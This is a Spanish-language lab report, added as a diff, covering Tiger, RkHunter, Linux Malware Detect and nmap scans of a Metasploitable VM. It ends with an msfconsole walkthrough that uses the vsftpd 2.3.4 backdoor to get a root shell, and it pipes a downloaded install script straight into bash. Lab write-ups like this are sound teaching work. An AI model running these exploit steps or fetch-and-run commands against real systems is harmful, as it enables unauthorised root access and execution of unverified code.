+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/sv/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/uk/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/eu/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/el/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/zh_TW/LC_TIME/coreutils.mo 
+% 			 is a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/it/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ms/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/vi/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/fr/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/sk/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/nb/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/bg/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/gl/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/ga/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/sl/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/locale/nl/LC_TIME/coreutils.mo is 
+% 			 a dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/share/doc/apache2/README.Debian is a 
+% 			 dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access /usr/lib/firefox-3.6.17/dictionaries is a 
+% 			 dangling symlink. 
+% 	--WARN-- [fsys013w] cannot access 
+% 			 /usr/lib/python2.3/site-packages/python-support.pth is a dangling 
+% 			 symlink. 
+% 	--WARN-- [fsys013w] cannot access 
+% 			 /usr/lib/python2.4/site-packages/python-support.pth is a dangling 
+% 			 symlink. 
+% 	--WARN-- [fsys013w] cannot access /etc/alternatives/vncpasswd.1.gz is a 
+% 			 dangling symlink. 
+	
+% 	# Checking unusual file names...
+	
+% 	# Looking for unusual device files...
+% 	--ALERT-- [fsys006a] Unexpected device files found: 
+% 	lrwxrwxrwx 1 root root 9 May 14  2012 /home/msfadmin/.bash_history -> /dev/null
+% 	crw------- 1 root root 5, 1 Mar 16  2010 /lib/udev/devices/console
+% 	crw-r----- 1 root kmem 1, 2 Mar 16  2010 /lib/udev/devices/kmem
+% 	brw------- 1 root root 7, 0 Mar 16  2010 /lib/udev/devices/loop0
+% 	crw------- 1 root root 10, 200 Mar 16  2010 /lib/udev/devices/net/tun
+% 	crw------- 1 root root 1, 3 Mar 16  2010 /lib/udev/devices/null
+% 	crw------- 1 root root 108, 0 Mar 16  2010 /lib/udev/devices/ppp
+% 	lrwxrwxrwx 1 root root 9 May 14  2012 /root/.bash_history -> /dev/null
+	
+	
+% 	# Checking symbolic links...
+% 	--ERROR-- [init001e] Don't have required command REALPATH.
+	
+% 	# Performing check of embedded pathnames...
+% 	05:47> Security report completed for metasploitable.localdomain.
+	
+% \end{minted}
+
+Al igual que el caso anterior, tenemos las mismas diferencias. Sin embargo, nos llama la atención un elemento que es claramente notorio en msf. Primero, hay archivos de dispositivo \texttt{dev}, que son anormales. Esto es tipico de cuando se configuran herramientas para generar logs pero luego nunca se cierrar como corresponde. Por otro lado, algo que muestra en contraste a lynis es que indica que usuarios tienen permisos para ciertos servicios (los cuales en este caso claramente estan mal).  Por otro lado, si bien debieramos preocuparnos al igual que en análisis anterior respecto a los grupos que tienen diferentes claves, esto no tiene mucho sentido dependiendo del contexto.
+
+Por ejemplo, a nosotros no nos interesa si el grupo cdrom tiene o uno siquiera una contraseña, dado que ese grupo (y usuario) no tiene privilegios de login. Por tanto, si bien existe como usuario, no puede ser usado para ingresar a la máquina. Por otro lado, las restricciones impuestas sobre ese solo le permiten acceder a un dispositivo (el cd-rom). Estas alertas siempre van a aparecer pero podemos elegir no tomarlas en cuenta debido a este fenómeno. 
+
+
+\subsection{RkHunter}
+
+Este software pertenece a una categoria diferente a la anterior. No está principalmente orientado a la detección y prevención de intrusiones, mas bien, orientado a ver si existen procesos que puedan generar problemas, mas especificamente, encontrar procesos ofensores como rootkits.
+
+Al ver el código fuente se puede apreciar que en este a diferencia de los anteriores, es necesaria una instalación. Esto es porque es necesario acceder a anillos inferiores de ejecución para poder revisar el estado de la IPC table.
+
+Por otro lado, también esta herramienta hace uso de otras externas para extender el análisis. Nosotros no cubriremos esos aspectos en este laboratorio.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	wget --output-document=rkhunter.tar.gz https://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz --no-check-certificate
+
+	# for ubuntu
+	scp -q ./rkhunter.tar.gz  user@192.168.0.138:~/tmp-rkhunter-remote.tgz 
+	ssh user@192.168.0.138 "sudo -S rm -rfv ~/tmp-rkhunter && mkdir -p ~/tmp-rkhunter && cd ~/tmp-rkhunter && tar xzf ../tmp-rkhunter-remote.tgz && rm ../tmp-rkhunter-remote.tgz && cd rkhunter-1.4.6/ &&  sudo -S ./installer.sh --install && sudo -S rkhunter --propupd && sudo -S rkhunter --check --sk && sudo -S cp /var/log/rkhunter.log ~/rkhunter.log && sudo -S chown -R user:user ~/rkhunter.log"
+	scp -r -q user@192.168.0.138:/home/user/rkhunter.log ./rkhunter_log_user@192.168.0.138
+
+	# for msf
+	scp -q ./rkhunter.tar.gz  msfadmin@192.168.0.184:~/tmp-rkhunter-remote.tgz 
+	ssh msfadmin@192.168.0.184 "sudo -S rm -rfv ~/tmp-rkhunter && mkdir -p ~/tmp-rkhunter && cd ~/tmp-rkhunter && tar xzf ../tmp-rkhunter-remote.tgz && rm ../tmp-rkhunter-remote.tgz && cd rkhunter-1.4.6/ &&  sudo -S ./installer.sh --install && sudo -S rkhunter --propupd && sudo -S rkhunter --check --sk && sudo -S cp /var/log/rkhunter.log ~/rkhunter.log && sudo -S chown -R msfadmin:msfadmin ~/rkhunter.log"
+	scp -r -q msfadmin@192.168.0.184:/home/msfadmin/rkhunter.log ./rkhunter_log_msfadmin@192.168.0.184
+\end{minted}
+
+Lo primero que nos salta a la vista no es un rootkit. Es el mensaje \texttt{Warning: The command 'XXXXX' has been replaced by a script}. Esto podría ser bastante malo dependiendo de como se mire. Si bien en la práctica, estas herramientas suelen ser scripts, desde versiones relativamente antiguas del núcleo (digamos, 2.10.x?) estos scripts han sido cambiados directamente por binarios los cuales son cargados durante la etapa de arranque si es que no son encontrados directamente desde el sistema de archivos. Ahora estos binarios utilizan una abi relativamente estándar respecto a la arquitectura (de hecho esa es la razón por la cual es importante elegir bien la instalación, no queremos ejecutar una versión de 64bits sobre una maquina de 32 y no tener un intérprete de comandos por ejemplo).
+
+Entonces, esta necesidad de tener scripts ya desapareció. Lo problemático del asunto es que al ser scripts y no binarios, esto permite que puedan ser cambiados con relativa facilidad desde el espacio de usuario. Adicionalmente puede revelar que los binarios originales fueron reemplazados y estos scripts con permisos de ejecucion si bien ejecutan la misma tarea, pueden estar logueando alguna actividad. Por tanto, este mensaje de msf es bastante problemático.
+
+Las otras alertas como posible rootkits por procesos en IPC, memoria asignada a postgres y demases son propias de los serivicios instalados de msf, por lo que no vale la pena mencionar ya que es lo que se ha visto. Mención especial a la memoria asignada por postgres ya que es causa típica que el proceso de vaccum se cuelgue en servidores productivos. No es un problema, pero es un lindo detalle de parte del equipo de msf de dejar eso ahi.
+
+
+\subsection{Linux Malware detect}
+
+Idéntica categoria al anterior. Sin embargo, aca nos encontramos con un proceso mucho menos automatizado. Una opción es bajar los elementos por medio de git (el cual msf no tiene) y como segundo, copiar el repositorio y ejecutar una instalación directa. Esta segunda opción es la que elegimos. En este caso vamos a omitir el scaneo para la instancia de msf, ya que por la cantidad de directorios activos que tiene, tarda mas de dos horas.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	wget --output-document=lmd.zip https://codeload.github.com/rfxn/linux-malware-detect/zip/master --no-check-certificate
+
+	# for ubuntu
+	scp -q ./lmd.zip  user@192.168.0.138:~/tmp-lmd-remote.zip 
+	ssh user@192.168.0.138 "sudo -S rm -rfv ~/tmp-lmd && mkdir -p ~/tmp-lmd && cd ~/tmp-lmd && unzip ../tmp-lmd-remote.zip && rm ../tmp-lmd-remote.tgz && cd linux-malware-detect-master &&  sudo -S ./install.sh --install && sudo -S maldet -a /" 
+\end{minted}
+
+Esta herramienta a diferencia de las anteriores, no almacena los logs en una posición fija, por tanto los recuperamos despues de ver la salida.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{text}
+Linux Malware Detect v1.6.4
+	(C) 2002-2019, R-fx Networks <proj@rfxn.com>
+	(C) 2019, Ryan MacDonald <ryan@rfxn.com>
+This program may be freely redistributed under the terms of the GNU GPL v2
+
+maldet(203176): {scan} signatures loaded: 17045 (14225 MD5 | 2035 HEX | 785 YARA | 0 USER)
+maldet(203176): {scan} building file list for /, this might take awhile...
+maldet(203176): {scan} setting nice scheduler priorities for all operations: cpunice 19 , ionice 6
+maldet(203176): {scan} file list completed in 10s, found 5492 files...
+maldet(203176): {scan} scan of / (5492 files) in progress...
+maldet(203176): {scan} 5492/5492 files scanned: 2 hits 0 cleaned[[D
+
+maldet(203176): {scan} scan completed on /: files 5492, malware hits 2, cleaned hits 0, time 515s
+maldet(203176): {scan} scan report saved, to view run: maldet --report 200802-1753.203176
+maldet(203176): {scan} quarantine is disabled! set quarantine_hits=1 in conf.maldet or to quarantine results run: maldet -q 200802-1753.203176
+\end{minted}
+
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{text}
+HOST:      user-VirtualBox
+SCAN ID:   200802-1753.203176
+STARTED:   Aug  2 2020 17:53:57 -0400
+COMPLETED: Aug  2 2020 18:02:32 -0400
+ELAPSED:   515s [find: 10s]
+
+PATH:          /
+TOTAL FILES:   5492
+TOTAL HITS:    2
+TOTAL CLEANED: 0
+
+WARNING: Automatic quarantine is currently disabled, detected threats are still accessible to users!
+To enable, set quarantine_hits=1 and/or to quarantine hits from this scan run:
+/usr/local/sbin/maldet -q 200802-1753.203176
+
+FILE HIT LIST:
+{HEX}php.gzbase64.inject.452 : /home/user/tmp-lmd/linux-malware-detect-master/files/clean/gzbase64.inject.unclassed
+{HEX}php.cmdshell.iTSecTeam.286 : [confidencial]
+===============================================
+Linux Malware Detect v1.6.4 < proj@rfxn.com >
+\end{minted}
+
+Efectivamente encontró un archivo infectado. Se ha omitido la ruta ya que esta pertenece a un proyecto de terceros para los cuales la máquina virtual con ubuntu fue utilizada con anterioridad para ejecutar análisis (de hecho, ese fue el motivo real de por que usar esta máquina). El disco cargado en esta máquina es un honeypot cargado con anterioridad, el cual sufrió una brecha.
+
+\section{nmap}
+
+La ejecución de nmap fue hecha desde nuestro host hacia la instancia de metasploitable. La agresividad al máximo, escaneo de todos los puertos y detección de servicios. El resultado se encuentra adjunto a este informe.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+	sudo apt install xsltproc nmap
+	nmap -oX outputfile.xml  -p- -sV --version-intensity 5 192.168.0.184
+	xsltproc outputfile.xml -o outputfile.html
+	xdg-open outputfile.html
+\end{minted}
+
+
+En un comentario personal, este tipo de situaciones por muy de laboratorio que pueda parecer, es batante comun de encontrarse. Mas especificamente, maquinas que tienen mas servicios expuestos de los que realmente están utilizando. Suele pasar entre equipos de desarrollo pequeños en los cuales se ven forzados a lanzar a ambiente productivo las pruebas de concepto.
+
+\section{Explotando FTP}
+En la actividad anterior encontramos que FTP está en su versión 2.3.4, la cual tiene vulnerabilidades explotables por medio de msfconsole. msfconsole en realidad no es mas que un intérprete para ejecutar ataques automatizados (bastante popular entre los script kiddies). Como vamos a realizar este ataque desde nuestra máquina host, vamos a instalar directamente msfconsole.
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+sudo apt install gnupg2
+gpg2 --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
+curl -L https://get.rvm.io | bash -s stable
+source ~/.rvm/scripts/rvm
+echo "source ~/.rvm/scripts/rvm" >> ~/.bashrc
+source ~/.bashrc
+RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
+rvm install $RUBYVERSION
+rvm use $RUBYVERSION --default
+cd /opt
+sudo git clone https://github.com/rapid7/metasploit-framework.git
+sudo chown -R `whoami` /opt/metasploit-framework
+cd metasploit-framework
+rvm --default use ruby-${RUBYVERSION}@metasploit-framework
+gem install bundler
+bundle install
+echo "export PATH=$PATH:/usr/lib/postgresql/10/bin" >> ~/.bashrc
+. ~/.bashrc 
+./msfdb init
+msfconsole
+\end{minted}
+
+Para los mas contemporáneos, es mejor utilizar msfconsole directamente desde un contenedor Docker. Esta es la manera recomendada de ejecutar msfconsole de acuerdo al autor de este documento (la opinión puede cambiar dependiendo de quien lea esto):
+
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+docker run -it --rm metasploitframework/metasploit-framework
+\end{minted}
+
+\subsection{Buscando login anonimo}
+
+Comandos: 
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+use auxiliary/scanner/ftp/anonymous
+set rhosts 192.168.0.184
+exploit
+\end{minted}
+
+Salida:
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+[+] 192.168.0.184:21      - 192.168.0.184:21 - Anonymous READ (220 (vsFTPd 2.3.4))
+[*] 192.168.0.184:21      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed	
+\end{minted}
+
+Conclusión: Tenemos acceso anónimo.
+
+
+\subsection{Backdoor}
+
+Vamos a instalar un backdoor utilizando el acceso anónimo. Para esto primero buscamos que exploits tenemos disponibles, finalmente ejecutamos.
+
+Comandos: 
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set rhosts 192.168.0.184
+exploit
+whoami
+\end{minted}
+
+Salida:
+
+\begin{minted}[linenos,tabsize=2,breaklines,fontsize=\scriptsize]{bash}
+msf5 exploit(auxiliary/scanner/ftp/anonymous) > search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf5 exploit(auxiliary/scanner/ftp/anonymous) >
+msf5 exploit(auxiliary/scanner/ftp/anonymous) > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/unix/interact
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.0.184
+rhosts => 192.168.0.184
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.0.184:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.0.184:21 - USER: 331 Please specify the password.
+[+] 192.168.0.184:21 - Backdoor service has been spawned, handling...
+[+] 192.168.0.184:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.0.184:6200) at 2020-08-02 23:00:50 +0000
+root
+\end{minted}
+
+Conclusión: Tenemos una shell con privilegios de root.
+
+\section{Conclusiones y sugerencias}
+
+En este trabajo se presentó el uso de herramientas para la auditoría de seguridad mediante una guia comprensiva de el uso de estas. Finalmente se replicó el trabajo que realiza un script kiddie utilizando msfconsole.
+
+\subsection{Recomendaciones}
+No hay que tomar a la ligera el trabajo de un script kiddie, ya que por bastante poco conocimiento o interés tenga en aprender que es lo que hace, existe una gran cantidad de herramientas de uso automatizado disponibles. Esto funciona para ambos lados, sin embargo, urge extremar las medidas de precaución.
+
+En este contexto, podemos resumir nuestras recomendaciones generales en las siguientes:
+
+\begin{itemize}
+	\item No levantar servicios que no se estén utilizando.
+	\item Separar ambientes de desarrollo de los ambientes productivos.
+	\item Realizar escaneos y limpiezas de manera periódica.
+\end{itemize}
+
+Por otro lado, ya mas exclusivas de lo visto con metasploitable, nuestra recomendación general es mantener el sistema actualizado de por si. El primer vector de ataque suelen ser versiones no parchadas de servicios que estén siendo utilizados. Por otro lado, recordando el caso de los binarios como script de la primera sección, también tener nuestro sistema actualizado nos permite identificar mas rápido este tipo de casos, ya que se espera que en versiones actuales del núcleo, tales problemas no existan.
+
+Por otro lado, si fueramos a observar a metasploitable como una plataforma objetivo para endurecer, el panorama no es muy alentador. La opción obvia sería comenzar a ejecutar una actualización por completo de los servicios y luego una limpieza de estos. Sin embargo, si nos ponemos en la situacion de que deseamos endurecer el sistema para proveer un servicio ftp, entonces una opción mucho más viable es reinstalar todo el sistema.
+
+Por lo general son desiciones de este estilo las que entorpecen le proceso de seguridad de los datos en muchos desarrollos.
+\begin{thebibliography}{9}
+
+	\bibitem{REF:Lynis}
+	Documentación de Lynis
+	\textit{lynis homepage}.
+	https://cisofy.com/lynis/
+
+	\bibitem{REF:Tiger}
+	Documentación de Tiger
+	\textit{Tiger homepage}.
+	https://www.nongnu.org/tiger/
+
+	
+	\bibitem{REF:RkHunter}
+	Documentación de RkHunter
+	\textit{RkHunter homepage}.
+	http://rkhunter.sourceforge.net/
+
+	
+	\bibitem{REF:LMD}
+	Documentación de LMD
+	\textit{LMD homepage}.
+	https://www.rfxn.com/projects/linux-malware-detect/
+
+	\bibitem{REF:nmap}
+	Documentación de nmap
+	\textit{nmap homepage}.
+	https://nmap.org/
+
+	\bibitem{REF:msfconsole}
+	Dockerhub de metasploit
+	\textit{dockerhub}.
+	https://hub.docker.com/r/metasploitframework/metasploit-framework/
+
+
+	\bibitem{REF:msf}
+	Documentación de msfconsole
+	\textit{offensive-security.com}.
+	https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+\end{thebibliography}
+
+\end{document}
